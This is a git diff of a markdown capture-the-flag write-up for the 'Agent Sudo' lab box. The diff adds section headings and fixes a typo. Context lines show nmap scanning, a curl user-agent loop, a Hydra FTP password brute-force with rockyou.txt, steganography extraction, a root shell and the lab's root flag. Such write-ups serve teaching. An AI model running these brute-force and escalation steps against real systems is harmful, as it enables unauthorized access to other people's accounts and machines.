@@ -8,7 +8,20 @@ tags:
   - stenography
   - forensics
 ---
+## Table of Contents
 
+1. [Introduction](#introduction)
+2. [Nmap Scan Results](#Nmap_Scan_Results)
+3. [Enumerating HTTP](#Enumerating_HTTP)
+4. [FTP Password Cracking](#FTP_Password_Cracking)
+5. [Image Forensics](#Image_Forensics)
+6. [Privilege Escalation](#Privilege_Escalation)
+7. [Root Flag](#Root_Flag)
+9. [Conclusion](#Conclusion)
+
+## Introduction
+
+##  Nmap scan results
 The Nmap scan returns 3 open ports
 ```
 └─$ nmap -sV 10.10.83.69
@@ -21,6 +34,7 @@ PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 ```
+## Enumerating HTTP
 I began by enumerating port 80 (HTTP) via the web browser
 
 ![image](https://github.com/user-attachments/assets/c1f4a4be-b945-4a8a-9799-75b6178b16f8)
@@ -53,13 +67,14 @@ for letter in {A..Z}; do
     curl -L -A $letter 10.10.83.69; echo "Letter: $letter"
 done
 ```
-Running and evaluating the results from the script, we can see that the user-agent of Agent C gives a different repsonce to the others.
+Running and evaluating the results from the script, we can see that the user-agent of Agent C gives a different response to the others.
 ```
 Attention chris, <br><br>
 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
 From,<br>
 Agent R
 ```
+#FTP Password Cracking
 We now know that there is a user named: Chris and that his password is weak. We can try to brute-force the ftp login with the username "chris". To do this I will be using Hydra Password Cracker
 ```
 └─$ hydra -l chris -P WordLists/rockyou.txt 10.10.83.69 ftp
@@ -87,6 +102,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
+## Image Forensics
 This tells us that there is a password stored inside the image, to retrieve this we can use the Binwalker tool
 ```
 └─$ binwalk cute-alien.jpg
@@ -189,6 +205,7 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 Your buddy,
 chris 
 ```
+## User Flag
 We now have a user and password combination for user Chris, we will now log in to SSH with these credentials
 ```
 james@agent-sudo:~$ ls -la
@@ -217,8 +234,10 @@ Alien_autospy.jpg
 ![image](https://github.com/user-attachments/assets/315b7194-fb69-4513-93bf-6cc0d56c13a3)
 
 We can reverse image search this online:
+
 ![image](https://github.com/user-attachments/assets/8cd0e437-4c60-493b-9ae7-3a0c0cb24082)
 
+## Privilege Escalation
 Now to gain root privileges...
 We can check what privileges we have using 
 ```
@@ -240,6 +259,7 @@ root@agent-sudo:~# whoami
 root 
 ```
 We now have root privileges!
+## Root Flag
 ```
 root@agent-sudo:/root# cat root.txt
 To Mr.hacker,
@@ -251,4 +271,5 @@ DesKel a.k.a Agent R
 ```
 And can find the root flag: b53a02f55b57d4439e3341834d70c062
 
+## Conclusion
 
